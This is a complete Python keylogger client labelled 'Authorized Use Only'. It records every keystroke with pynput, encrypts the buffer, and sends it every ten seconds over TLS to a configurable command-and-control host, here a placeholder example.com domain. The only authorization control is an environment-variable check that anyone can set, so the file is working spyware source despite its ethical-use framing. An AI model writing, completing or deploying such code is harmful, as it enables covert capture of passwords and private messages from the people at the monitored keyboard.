#!/usr/bin/env python3
"""
Secure Keylogger Client - Authorized Use Only
Author: [Your Name / Organization]
License: Ethical Use Only

Requirements:
- pynput (pip install pynput)
- cryptography
"""

import os
import sys
import time
import socket
import ssl
import hashlib
import platform
import threading
from cryptography.fernet import Fernet
from pynput import keyboard

# ===== CONFIGURATION =====
AUTHORIZED_C2_SERVER = "your-authorized-server.example.com"
AUTHORIZED_PORT = 443
PSK = "YOUR_COMPANY_PSK_" + time.strftime("%Y%m%d")
BUFFER_SEND_INTERVAL = 10  # seconds

# ===== AUTHORIZATION CHECK =====
def verify_authorization():
    if platform.system().lower() not in ["linux", "windows", "darwin"]:
        sys.exit("Unsupported platform for keylogger")
    if os.getenv("AUTHORIZED_TESTING") != "TRUE":
        sys.exit("Missing authorization environment variable")

# ===== ENCRYPTION =====
class SecureChannel:
    def __init__(self, psk):
        import base64
        self.cipher = Fernet(
            base64.urlsafe_b64encode(
                hashlib.sha256(psk.encode()).digest()
            )
        )

    def encrypt(self, data):
        return self.cipher.encrypt(data.encode())

    def decrypt(self, data):
        return self.cipher.decrypt(data).decode()

# ===== CONNECTION =====
def establish_connection():
    try:
        context = ssl.create_default_context()
        context.check_hostname = True
        context.verify_mode = ssl.CERT_REQUIRED

        sock = socket.create_connection((AUTHORIZED_C2_SERVER, AUTHORIZED_PORT), timeout=30)
        secure_sock = context.wrap_socket(sock, server_hostname=AUTHORIZED_C2_SERVER)

        secure_sock.sendall(hashlib.sha256(PSK.encode()).hexdigest().encode())
        if secure_sock.recv(1024) != b"AUTH_OK":
            raise ValueError("Server authentication failed")

        return SecureChannel(PSK), secure_sock
    except Exception as e:
        print(f"Connection error: {str(e)}")
        sys.exit(1)

# ===== KEYLOGGER LOGIC =====
class KeyLogger:
    def __init__(self, channel, conn):
        self.channel = channel
        self.conn = conn
        self.log = ""
        self.lock = threading.Lock()
        self.running = True

    def on_press(self, key):
        try:
            k = key.char
        except AttributeError:
            k = f"<{key.name}>"
        with self.lock:
            self.log += k

    def send_log_periodically(self):
        while self.running:
            time.sleep(BUFFER_SEND_INTERVAL)
            with self.lock:
                if self.log:
                    encrypted = self.channel.encrypt(self.log)
                    length = len(encrypted).to_bytes(4, byteorder='big')
                    try:
                        self.conn.sendall(length + encrypted)
                    except Exception as e:
                        print(f"Send error: {e}")
                        self.running = False
                    self.log = ""

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        sender_thread = threading.Thread(target=self.send_log_periodically, daemon=True)
        sender_thread.start()

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            listener.stop()
            print("Keylogger stopped by user.")

if __name__ == "__main__":
    print("Keylogger Client - Authorized Use Only")
    verify_authorization()

    channel, conn = establish_connection()
    print(f"Connected to {AUTHORIZED_C2_SERVER} - starting keylogger...")

    keylogger = KeyLogger(channel, conn)
    keylogger.start()

    conn.close()
